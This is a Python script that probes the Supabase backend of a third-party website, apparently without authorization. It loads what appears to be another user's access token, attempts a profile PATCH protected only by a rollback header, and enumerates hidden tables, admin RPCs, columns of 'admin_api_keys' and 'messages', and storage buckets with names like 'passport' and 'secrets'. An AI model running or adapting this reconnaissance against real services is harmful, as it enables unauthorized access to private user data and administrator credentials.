#!/usr/bin/env python3
# Supabase-angle probe round 2 (read-only): schema-cache hints, tx=rollback, graphql_public, storage bucket oracle, columns
import json, sys, time, urllib.request, urllib.error, ssl

BASE = "https://cdn.onlyfakeai.ru"
PK = "<publishable-key>"
TOK = json.load(open("their_token.txt"))["access_token"]
UID = "<redacted-user-uuid>"
UA = "Mozilla/5.0 (supa-angle-probe)"
ctx = ssl.create_default_context()
reqs = 0

def call(method, path, headers=None, body=None, note="", raw=False):
    global reqs
    url = BASE + path
    h = {"apikey": PK, "User-Agent": UA}
    if headers: h.update(headers)
    data = None
    if body is not None:
        data = body if isinstance(body, (bytes, str)) else json.dumps(body).encode()
        if isinstance(body, str): data = body.encode()
        h.setdefault("Content-Type", "application/json")
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=20, context=ctx) as resp:
            txt = resp.read(2500).decode("utf-8", "replace"); st = resp.status; rh = dict(resp.headers)
    except urllib.error.HTTPError as e:
        txt = e.read(2500).decode("utf-8", "replace"); st = e.code; rh = dict(e.headers)
    except Exception as e:
        st, rh, txt = "ERR", {}, repr(e)
    reqs += 1
    hd = {k: v for k, v in rh.items() if k.lower() in ("content-type","allow","x-sb-version","server",
          "sb-gateway-version","sb-project-ref","preference-applied","content-range","x-ratelimit-remaining","retry-after")}
    print(f"\n### [{reqs}] {method} {note or path} -> {st}")
    print("HD:", json.dumps(hd, ensure_ascii=False))
    print("BODY:", txt.replace("\n", " ")[:800])
    time.sleep(0.3)
    return st, rh, txt

print("== schema-cache hints for tables ==")
call("GET", "/rest/v1/profiless?select=*&limit=1", note="table hint profiless")
call("GET", "/rest/v1/jobss?select=*&limit=1", note="table hint jobss")
call("GET", "/rest/v1/admin_api_key?select=*&limit=1", note="table hint admin_api_key(singular)")
call("GET", "/rest/v1/zzz_nonexistent_table_qq?select=*", note="table hint random")

print("\n== new RPC from hint + graphql rpc ==")
call("POST", "/rest/v1/rpc/get_admin_credit_leaderboard", body={}, note="rpc get_admin_credit_leaderboard empty")
call("POST", "/rest/v1/rpc/graphql", headers={"Content-Profile": "graphql_public"}, body={"query": "{ __typename }"}, note="pg_graphql via rpc Content-Profile")
call("GET", "/rest/v1/rpc/graphql?query=%7B__typename%7D", headers={"Accept-Profile": "graphql_public"}, note="pg_graphql via GET rpc Accept-Profile")

print("\n== tx=rollback support ==")
st, rh, txt = call("PATCH", f"/rest/v1/profiles?user_id=eq.{UID}", headers={"Authorization": "Bearer " + TOK, "Prefer": "tx=rollback"},
                   body={"remarks": "txprobe-should-not-persist"}, note="PATCH profiles tx=rollback")
call("GET", f"/rest/v1/profiles?user_id=eq.{UID}&select=remarks", headers={"Authorization": "Bearer " + TOK}, note="verify remarks after rollback")

print("\n== column oracles ==")
for tbl, cols in {
    "messages": ["id","user_id","message","text","content","created_at","read","title","email","name","receiver_id","sender_id","type","status"],
    "admin_api_keys": ["id","key","api_key","name","user_id","created_at","revoked","created_by","key_hash","secret","label","active","role"],
    "jobs": ["download_url","no_watermark_url","prompt","params","error"],
}.items():
    for c in cols:
        call("GET", f"/rest/v1/{tbl}?select={c}&limit=0", note=f"col {tbl}.{c}")

print("\n== storage bucket existence oracle ==")
for b in ["photos","backgrounds","portraits-public","id","dl","passport","residence","product","templates","site-assets",
          "documents","private","no-watermark","backups","exports","invoices","admin","temp","uploads","avatars","results",
          "originals","generated","previews","user-uploads","public","assets","secrets","config","worker","jobs","payments","archive"]:
    call("POST", f"/storage/v1/object/list/{b}", body={"prefix": "", "limit": 1, "offset": 0}, note=f"bucket oracle {b}")

print("\n== storage misc ==")
call("GET", "/storage/v1/version", note="storage version")
call("GET", "/storage/v1/object/info/public/photos/1778112266686_preview.png", note="object info public")
call("GET", "/realtime/v1/health", note="realtime health http")

print(f"\nTOTAL REQUESTS: {reqs}")
